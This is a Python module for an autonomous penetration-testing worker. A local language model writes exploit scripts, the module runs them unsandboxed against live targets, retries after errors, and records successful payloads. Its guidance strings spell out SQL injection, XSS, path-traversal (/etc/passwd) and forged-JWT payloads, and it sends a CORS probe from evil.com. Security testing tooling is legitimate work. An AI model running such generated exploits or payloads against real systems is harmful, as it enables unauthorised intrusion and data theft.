"""
tools/coven/salem_familiar.py
==============================
SalemFamiliar — autonomous pentest worker that claims tasks from GrimoireBlackboard,
performs live HTTP probing via LLM-generated exploit scripts (agentic probe), and
pushes findings back. Self-corrects on code errors with a fixer pass.

Extracted from sabrina_coven_orchestrator_LAB.py (SalemFamiliar class).
"""

import os
import sys
import re
import json
import time
import subprocess
import threading
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse

from .shared import (
    C, OLLAMA_URL, OLLAMA_WORKER_MODEL, OLLAMA_PLANNER_MODEL,
    _ollama_chat, _http_get, ScopePolicy,
)
from ai_systems.framework.prompt_loader import get_agent_config, render_prompt
from .blackboard import GrimoireBlackboard
from .akashic_memory import AkashicMemory, SwarmMetaLearner
from .waf_bypass import MrMimeWAFBypass, HypnoSessionManager, DeserializationHunter

try:
    from tools.response_classifier import ResponseClassifier
except ImportError:
    ResponseClassifier = None


# ─────────────────────────────────────────────────────────────────────────────
#  Vuln-type normalizer (mirrors FindingLedger.normalize_vuln_type)
# ─────────────────────────────────────────────────────────────────────────────

VULN_ALIASES: Dict[str, str] = {
    "sql_injection": "sqli", "sql injection": "sqli", "sqli": "sqli",
    "cross-site scripting": "xss", "cross_site_scripting": "xss", "xss": "xss",
    "insecure direct object reference": "idor", "idor": "idor",
    "server-side request forgery": "ssrf", "ssrf": "ssrf",
    "open redirect": "open_redirect", "unvalidated redirect": "open_redirect",
    "xml external entity": "xxe", "xxe": "xxe",
    "insecure deserialization": "deserialization",
    "session management": "session",
    "authentication bypass": "auth_bypass",
    "broken access control": "broken_access_control",
}

def _norm_vt(raw: str) -> str:
    return VULN_ALIASES.get(raw.lower().strip(), raw.lower().strip())


# ─────────────────────────────────────────────────────────────────────────────
#  Traffic shim builder
# ─────────────────────────────────────────────────────────────────────────────

def _build_traffic_shim(task_id: str, vuln_type: str, log_path: str,
                        bearer_token: str = "") -> str:
    """Minimal stdlib HTTP traffic logger shim injected into LLM-generated scripts."""
    auth_line = f'_AUTH_TOKEN = {repr(bearer_token)}' if bearer_token else '_AUTH_TOKEN = ""'
    return f'''
# ── SABRINA HTTP TRAFFIC LOGGER ─────────────────────────────────────────────
import urllib.request as _orig_ur
import json as _json_log, time as _time_log, os as _os_log
_TRAFFIC_LOG = {repr(log_path)}
{auth_line}
_orig_urlopen = _orig_ur.urlopen

def _sabrina_urlopen(req, *a, **kw):
    import urllib.error as _ue
    try:
        resp = _orig_urlopen(req, *a, **kw)
        return resp
    except _ue.HTTPError as e:
        return e

_orig_ur.urlopen = _sabrina_urlopen
# ─────────────────────────────────────────────────────────────────────────────
'''


# ─────────────────────────────────────────────────────────────────────────────
#  SalemFamiliar — autonomous worker
# ─────────────────────────────────────────────────────────────────────────────

class SalemFamiliar:
    """
    A single autonomous pentest worker. Spun up as a thread by the orchestrator.
    Continuously claims tasks from GrimoireBlackboard, executes probes, and posts findings.
    """

    def __init__(self,
                 name: str,
                 blackboard: GrimoireBlackboard,
                 scope_policy: Optional[ScopePolicy] = None,
                 dry_run: bool = True,
                 worker_index: int = 0,
                 swarm_memory: Optional[AkashicMemory] = None,
                 meta_learner: Optional[SwarmMetaLearner] = None,
                 waf_bypass: Optional[MrMimeWAFBypass] = None,
                 deserial_hunter: Optional[DeserializationHunter] = None,
                 hypno_session: Optional[HypnoSessionManager] = None,
                 evidence_pack: Optional[Any] = None,
                 ws_endpoint: str = "",
                 creds: Optional[Any] = None):
        self.name            = name
        self.blackboard      = blackboard
        self.scope           = scope_policy
        self.dry_run         = dry_run
        self.worker_index    = worker_index
        self.swarm_memory    = swarm_memory
        self.meta_learner    = meta_learner
        self.waf_bypass      = waf_bypass or MrMimeWAFBypass()
        self.deserial_hunter = deserial_hunter or DeserializationHunter()
        self.hypno_session   = hypno_session or HypnoSessionManager()
        self.evidence_pack   = evidence_pack
        self.finding_ledger  = blackboard.finding_ledger
        self._lock           = threading.Lock()

    def _log(self, msg: str):
        self.blackboard.write_log(self.name, msg)

    # ── Main run loop ─────────────────────────────────────────────────────────

    def run(self):
        self._log("Starting.")
        tasks_done = 0
        while True:
            task = self.blackboard.claim_task()
            if task is None:
                if self.blackboard.tasks_remaining() == 0:
                    break
                time.sleep(0.5)
                continue
            self._log(f"Claimed task {task.get('id','?')}: {task.get('vuln_type','?')} → {task.get('target','?')}")
            try:
                self._execute_task(task)
            except Exception as e:
                self._log(f"Task error: {e}")
            tasks_done += 1
        self._log(f"Finished. Completed {tasks_done} tasks.")

    # ── Task router ───────────────────────────────────────────────────────────

    def _execute_task(self, task: Dict[str, Any]):
        role      = task.get("worker_role", "Probe-Ant")
        target    = task.get("target", "")
        vuln_type = task.get("vuln_type", "recon")

        if self.scope:
            host = target.replace("https://", "").replace("http://", "").split("/")[0]
            if not self.scope.is_in_scope(host) and host:
                self._log(f"SKIP OOS: {target}")
                return

        print(f"\n  {C.CN}[{self.name}]{C.X} [{role}] [{vuln_type}] → {target}")

        if self.dry_run:
            self._dry_run_task(task)
        elif vuln_type == "recon" or role == "Recon-Ant":
            self._recon(task)
        elif role == "Deserial-Ant":
            findings = self.deserial_hunter.probe(
                target, getattr(self.blackboard, "_tech_stack", {}), dry_run=False
            )
            for f in findings:
                f["worker"] = self.name
                self.blackboard.post_finding(f)
        elif role == "Session-Ant":
            findings = self.hypno_session.run_all_tests(
                target, self.blackboard.get_auth_headers(target),
                dry_run=False
            )
            for f in findings:
                f["worker"] = self.name
                self.blackboard.post_finding(f)
        else:
            self._agentic_probe(task)

    # ── Dry-run reasoning ─────────────────────────────────────────────────────

    def _dry_run_task(self, task: Dict[str, Any]):
        vuln_type = task.get("vuln_type", "recon")
        target    = task.get("target", "")
        prompt = (
            f"You are a {task.get('worker_role','security')} penetration tester performing DRY-RUN analysis.\n\n"
            f"Target: {target}\nVuln type: {vuln_type}\n"
            f"Instructions: {task.get('instructions','')}\n\n"
            f"Reason step-by-step about what you would test and which endpoints/params are likely vulnerable.\n"
            f"If a vulnerability is likely, respond with JSON: "
            f'{{\"vuln_type\":\"{vuln_type}\",\"url\":\"{target}\",\"severity\":\"...\",\"evidence\":\"...\",\"description\":\"...\"}}\n'
            f"Otherwise respond: NO_FINDING"
        )
        response = _ollama_chat(
            f"You are an expert penetration tester specialising in web application security.",
            prompt, max_tokens=512
        )
        self._log(f"[DRY-RUN] {target}: {response[:150]}")

        if "NO_FINDING" not in response.upper():
            clean = re.sub(r"^```(?:json)?\s*|\s*```$", "", response.strip())
            try:
                finding = json.loads(clean)
                finding["worker"]  = self.name
                finding["dry_run"] = True
                self.blackboard.post_finding(finding)
            except Exception:
                pass

    # ── Recon (Mapper-Ant) ────────────────────────────────────────────────────

    def _recon(self, task: Dict[str, Any]):
        target = task.get("target", "").rstrip("/")
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
        host = target.split("/")[2]

        node: Dict[str, Any] = {
            "role":              task.get("product", "unknown"),
            "endpoints_found":   [],
            "js_api_paths":      [],
            "trust_connections": [],
            "tech_stack":        {},
            "cors_origins":      [],
            "oidc_config":       {},
            "waf_detected":      False,
        }

        # Layer 1: header fingerprinting
        status, body, headers = _http_get(target)
        if status:
            server  = headers.get("Server",     headers.get("server", ""))
            powered = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
            cf      = headers.get("CF-Ray",      headers.get("cf-ray", ""))
            stack: Dict[str, str] = {}
            if server:  stack["server"]    = server
            if powered: stack["framework"] = powered
            if cf:      stack["waf"]       = "Cloudflare"

            cookie_sigs = {"JSESSIONID": "Java/Tomcat", "PHPSESSID": "PHP",
                           "sid": "Node.js Express", "_okta": "Okta"}
            sc = headers.get("Set-Cookie", headers.get("set-cookie", ""))
            for ck, cx in cookie_sigs.items():
                if ck.lower() in sc.lower():
                    stack["runtime"] = cx

            waf_sigs = ["cf-ray", "x-sucuri-id", "x-cdn", "x-akamai", "x-protected-by"]
            for ws in waf_sigs:
                if ws in {k.lower() for k in headers}:
                    node["waf_detected"] = True
                    stack["waf"] = ws

            node["tech_stack"] = stack
            node["endpoints_found"].append({"url": target, "status": status})
            self._log(f"[MAP-L1] {host}: server={server or '?'} waf={node['waf_detected']}")

            # Layer 2: JS bundle crawl
            if status == 200 and body:
                html_links = re.findall(r'href=["\'](\\/[^"\'\\s>]+)["\']', body)
                for lnk in set(html_links[:30]):
                    if any(lnk.startswith(p) for p in ["/api/", "/rest/", "/oauth2/", "/.well-known/"]):
                        node["endpoints_found"].append({"url": target + lnk, "source": "html-link"})
                        self.blackboard.register_endpoint(lnk, "GET", source="html")

                js_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', body)
                for js_src in js_srcs[:5]:
                    if not js_src.startswith(("http://", "https://")):
                        js_src = target.rstrip("/") + "/" + js_src.lstrip("/")
                    js_status, js_body, _ = _http_get(js_src, timeout=12)
                    if js_status == 200 and js_body:
                        api_paths = re.findall(r'["\'](\\/(?:api|rest)\\/[a-zA-Z0-9_\\-\\/]+)["\']', js_body)
                        for ap in set(api_paths[:40]):
                            node["js_api_paths"].append(ap)
                            self.blackboard.register_endpoint(ap, "GET", source="js_bundle")
                        self._log(f"[MAP-L2] {host}: {len(api_paths)} API paths from JS bundle")

        # Layer 3: OIDC
        oidc_url = target + "/.well-known/openid-configuration"
        oidc_status, oidc_body, _ = _http_get(oidc_url)
        if oidc_status == 200:
            try:
                oidc = json.loads(oidc_body)
                node["oidc_config"] = {
                    "issuer": oidc.get("issuer", ""),
                    "token_endpoint": oidc.get("token_endpoint", ""),
                }
                self._log(f"[MAP-L3] {host}: OIDC issuer={oidc.get('issuer','')}")
            except Exception:
                pass

        # Layer 3: CORS
        cors_status, _, cors_headers = _http_get(
            target + "/api/v1/users",
            headers={"Origin": "https://evil.com",
                     "Access-Control-Request-Method": "GET"}
        )
        cors_origin = cors_headers.get(
            "Access-Control-Allow-Origin",
            cors_headers.get("access-control-allow-origin", "")
        )
        if cors_origin:
            node["cors_origins"].append(cors_origin)
            if cors_origin in ("*", "https://evil.com"):
                self.blackboard.post_finding({
                    "worker":    self.name,
                    "vuln_type": "cors_misconfiguration",
                    "url":       target + "/api/v1/users",
                    "severity":  "high",
                    "evidence":  f"Access-Control-Allow-Origin: {cors_origin}",
                    "description": f"Permissive CORS: origin='{cors_origin}'",
                })

        self.blackboard.update_infra_node(host, node)
        self._log(f"[MAPPER] {host}: {len(node['endpoints_found'])} endpoints | "
                  f"{len(node['js_api_paths'])} JS paths | waf={node['waf_detected']}")

    # ── Agentic probe (LLM writes exploit, we execute it) ─────────────────────

    def _agentic_probe(self, task: Dict[str, Any]) -> None:
        vuln_type    = task.get("vuln_type", "unknown")
        target       = task.get("target", "").rstrip("/")
        if target.startswith("https://localhost"):
            target = target.replace("https://", "http://")
        if not target.startswith("http"):
            target = "http://" + target
        instructions = task.get("instructions", "")
        product      = task.get("product", "web application")
        payout       = task.get("estimated_payout", "")

        worker_cfg = get_agent_config("swarm_worker")
        system_prompt = worker_cfg["backstory"]

        norm_vt = _norm_vt(vuln_type)
        auth_headers = self.blackboard.get_auth_headers(target)
        auth_section = f"Auth headers to use: {json.dumps(auth_headers)}\n" if auth_headers else ""

        recalled_notes = ""
        if self.swarm_memory:
            host = urlparse(target).netloc or target
            winning = self.swarm_memory.recall(host, norm_vt, top_k=3)
            if winning:
                p_list = [f"  - {w.get('payload')}" for w in winning if w.get('payload')]
                if p_list:
                    recalled_notes = "\nWinning payloads from past successful probes:\n" + "\n".join(p_list) + "\n"

        vt_guidance = self._build_guidance(norm_vt, target)

        def _build_prompt(error_context=""):
            fix_note = ""
            if error_context:
                fix_note = (
                    f"\n\nYour previous script had this error — FIX IT:\n"
                    f"```\n{error_context[:400]}\n```\n"
                    f"Write a corrected version.\n"
                )
            endpoint_section = (
                f"PROBE TARGET: {target}\n"
                f"Test ONLY this single endpoint. Do NOT iterate or append other paths.\n"
                + (f"Task brief:\n{instructions}\n" if instructions else "")
            )
            return render_prompt(
                "agentic_probe_task",
                target=target,
                vuln_type=norm_vt,
                known_creds=auth_section or "None",
                waf_hints=f"{endpoint_section}\n{recalled_notes}\n{fix_note}\n{vt_guidance}",
            )

        def _extract_code(raw: str) -> str:
            code = raw
            for marker in ["```python\n", "```python", "```\n", "```"]:
                if marker in code:
                    code = code.split(marker, 1)[1]
                    break
            if "```" in code:
                code = code.rsplit("```", 1)[0]
            return code.strip()

        def _auto_fix(code: str) -> str:
            import re as _re
            def _fix_post(m):
                return ('urllib.request.Request(' + m.group(1)
                        + ', data=' + m.group(2) + ', method="POST")')
            code = _re.sub(
                r'urllib\.request\.Request\(([^,)]+),\s*data\s*=\s*([^,)]+)\)',
                _fix_post, code
            )
            code = _re.sub(
                r"print\(\s*(SABRINA_(?:RESULT|FINDING):[^)]+)\)",
                lambda m: f"print({repr(m.group(1).strip())})",
                code
            )
            shim = _build_traffic_shim(
                task.get("id", "unknown"), vuln_type,
                self.blackboard.get_traffic_log_path(),
                bearer_token=self.blackboard.get_auth_token(target) or ""
            )
            if 'urllib' in code and 'SABRINA HTTP TRAFFIC LOGGER' not in code:
                lines = code.split('\n')
                insert_at = 0
                for idx, ln in enumerate(lines):
                    s = ln.strip()
                    if s and not s.startswith(('#', 'import', 'from')):
                        insert_at = idx
                        break
                lines.insert(insert_at, shim)
                code = '\n'.join(lines)
            return code

        def _run_code(code: str, attempt: int = 1) -> tuple:
            scripts_dir = getattr(self.blackboard, '_scripts_dir', '/tmp')
            task_id     = task.get("id", "unknown")
            script_path = os.path.join(
                scripts_dir, f"{task_id}-{vuln_type}-attempt{attempt}.py"
            )
            try:
                with open(script_path, "w") as f:
                    f.write(code)
            except Exception:
                script_path = f"/tmp/sabrina_{task_id}_{vuln_type}_a{attempt}.py"
                with open(script_path, "w") as f:
                    f.write(code)
            try:
                r = subprocess.run(
                    [sys.executable, script_path],
                    capture_output=True, text=True, timeout=60
                )
                return r.stdout, r.stderr, r.returncode
            except subprocess.TimeoutExpired:
                return "", "TimeoutExpired after 60s", -1
            except Exception as e:
                return "", str(e), -1

        # Attempt 1: generate and run
        current_model = OLLAMA_WORKER_MODEL
        self._log(f"[AGENTIC-PROBE] [{vuln_type}] Generating exploit for {target}...")
        print(f"  [AGENTIC-PROBE] [{vuln_type}] → {target} | generating ({current_model})...")
        sys.stdout.flush()

        raw1 = _ollama_chat(system_prompt, _build_prompt(), max_tokens=1400, model=current_model)
        if not raw1 or "[ERROR" in raw1:
            self._log(f"[AGENTIC-PROBE] [{vuln_type}] LLM call failed")
            return

        code1 = _auto_fix(_extract_code(raw1))
        if len(code1) < 30:
            self._log(f"[AGENTIC-PROBE] [{vuln_type}] Insufficient code returned")
            return

        print(f"  [AGENTIC-PROBE] [{vuln_type}] Code ready ({len(code1)} chars). Executing...")
        sys.stdout.flush()
        stdout1, stderr1, rc1 = _run_code(code1)

        for line in stdout1.splitlines():
            if line.startswith("[*]") or "SABRINA_" in line:
                print(f"    {line}")
        sys.stdout.flush()

        # Attempt 2: self-correction on error
        has_error   = (rc1 != 0 and stderr1.strip()) or "Traceback" in stderr1
        has_finding = "SABRINA_FINDING:" in stdout1

        if not has_finding and has_error:
            self._log(f"[AGENTIC-PROBE] [{vuln_type}] Script errored — self-correcting...")
            print(f"  [AGENTIC-PROBE] [{vuln_type}] Error — asking fixer...")
            sys.stdout.flush()
            error_ctx = stderr1.strip()[-400:] if stderr1 else "No output produced"
            raw2 = _ollama_chat(system_prompt, _build_prompt(error_ctx),
                                max_tokens=1400, model=current_model)
            if raw2 and "[ERROR" not in raw2:
                code2 = _auto_fix(_extract_code(raw2))
                if len(code2) > 30:
                    print(f"  [AGENTIC-PROBE] [{vuln_type}] Retry ({len(code2)} chars)...")
                    sys.stdout.flush()
                    stdout1, stderr1, rc1 = _run_code(code2, attempt=2)
                    for line in stdout1.splitlines():
                        if line.startswith("[*]") or "SABRINA_" in line:
                            print(f"    {line}")
                    sys.stdout.flush()

        # Parse findings
        classifier = ResponseClassifier() if ResponseClassifier else None
        findings_found = 0
        lines = stdout1.splitlines()
        i = 0
        while i < len(lines):
            line = lines[i].strip()
            if line.startswith("SABRINA_FINDING:"):
                raw_json = line[len("SABRINA_FINDING:"):].strip()
                j = i + 1
                while j < len(lines) and not raw_json.endswith("}"):
                    raw_json += " " + lines[j].strip()
                    j += 1
                raw_json = raw_json.replace("{{", "{").replace("}}", "}")
                try:
                    finding = json.loads(raw_json)
                except Exception as pe:
                    self._log(f"[AGENTIC-PROBE] JSON parse error: {pe} | {raw_json[:80]}")
                    i += 1
                    continue

                finding["worker"] = self.name
                finding["target"] = target
                finding["estimated_payout"] = payout
                finding.setdefault("severity", "medium")
                finding["vuln_type"] = _norm_vt(finding.get("vuln_type", vuln_type))

                # Deterministic verdict (if classifier available)
                if classifier:
                    resp_body   = str(finding.get("evidence", ""))
                    resp_status = int(finding.get("status", 200))
                    verdict, _  = classifier.classify_detailed(finding, resp_body, resp_status, None)
                    finding["classifier"] = verdict
                    if verdict not in ("CONFIRMED", "NEEDS_REVIEW"):
                        print(f"  [CLASSIFIER] {finding['vuln_type']} → FALSE_POSITIVE (suppressed)")
                        i = j
                        continue

                self.blackboard.post_finding(finding)

                sev  = finding.get("severity", "?").upper()
                color = C.R if sev in ("CRITICAL", "HIGH") else C.Y
                print(f"  [{color}CONFIRMED{C.X}] [{sev}] {finding['vuln_type']}: {finding.get('description','')[:80]}")
                sys.stdout.flush()
                findings_found += 1

                # Record to episodic memory
                if self.swarm_memory:
                    host = urlparse(target).netloc or target
                    self.swarm_memory.record(
                        host=host,
                        vuln_type=finding["vuln_type"],
                        payload=finding.get("payload", ""),
                        success=True,
                        tech_stack=getattr(self.blackboard, "_tech_stack", {}),
                        evidence=finding.get("evidence", ""),
                    )
            i += 1

        result_str = f"{findings_found} finding(s)" if findings_found else "no findings"
        self._log(f"[AGENTIC-PROBE] [{vuln_type}] Complete — {result_str}")
        print(f"  [AGENTIC-PROBE] [{vuln_type}] Done — {result_str}")
        sys.stdout.flush()

    # ── Per-vuln guidance strings ──────────────────────────────────────────────

    @staticmethod
    def _build_guidance(norm_vt: str, target: str) -> str:
        if norm_vt == "sqli":
            return (
                "METHODOLOGY FOR SQL INJECTION:\n"
                "- For login/auth POST endpoints: test JSON body {'email': \"' OR 1=1--\", 'password': 'foo'}.\n"
                "- For search GET endpoints: test query parameter ?q=apple'))-- or ?id=' OR '1'='1.\n"
                "- Confirm if HTTP 200 returns valid user/admin session token or unexpected data."
            )
        elif norm_vt == "idor":
            return (
                "METHODOLOGY FOR IDOR:\n"
                "- Focus EXCLUSIVELY on IDOR on private/authenticated resources.\n"
                "- Iterate numeric IDs: /endpoint/1, /endpoint/2 or ?id=1, ?id=2.\n"
                "- Confirm if another user's private data is returned. Public catalogs are NOT IDOR."
            )
        elif norm_vt == "xss":
            return (
                "METHODOLOGY FOR XSS:\n"
                "- Inject: '<iframe src=\"javascript:alert(1)\">', '<script>alert(1)</script>', '\"><img src=x onerror=alert(1)>'.\n"
                "- Confirm if the exact unescaped payload is reflected in the HTTP 200 response body."
            )
        elif norm_vt == "path_traversal":
            return (
                "METHODOLOGY FOR PATH TRAVERSAL:\n"
                "- Target file endpoints (/ftp, /public, /assets).\n"
                "- Payloads: '/ftp/eastere.gg', '/ftp/package.json.bak%2500.md', '../../../../etc/passwd'.\n"
                "- Confirm if sensitive file contents leak in the response."
            )
        elif norm_vt in ("auth_bypass", "privilege_escalation", "session", "broken_authentication"):
            return (
                "METHODOLOGY FOR AUTH BYPASS & SESSION:\n"
                "- Test admin endpoints without auth headers.\n"
                "- Try forged JWT tokens (alg: none) or stripped signature.\n"
                "- Try empty credentials or parameter tampering in login POST."
            )
        else:
            return f"Focus EXCLUSIVELY on {norm_vt}. Probe systematically."
